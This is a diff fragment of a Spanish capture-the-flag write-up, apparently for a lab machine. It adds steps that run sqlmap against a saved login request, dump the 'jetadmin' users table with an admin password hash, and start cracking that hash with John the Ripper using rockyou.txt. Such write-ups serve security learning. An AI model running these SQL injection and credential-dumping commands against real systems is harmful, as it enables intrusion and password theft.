@@ -211,10 +211,33 @@ username=uwu&password=uwu
 
 
 
+❯ sqlmap -r login –schema
 
+[INFO] fetching tables for databases: ‘information_schema, jetadmin’
 ```
 
+Nos ha arrojado directamente el `nombre de la BBDD` asi que vamos a `dumpear todo` lo que hay en ella:
 
+```
+❯ sqlmap -r login –D jetadmin --dump
+
+Database: jetadmin
+Table: users
+[1 entry]
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
++----+------------------------------------------------------------------+----------+
+```
+
+Nos da ese `hash`, entonces ahora lo tenemos que guardar en un archivo llamado "hash" y lo vamos a romper con `john the reaper`
+
+```
+> john --wordlist=rockyou.txt hash
+
+
+```
 
 ## WEB: puerto 80 | http
 
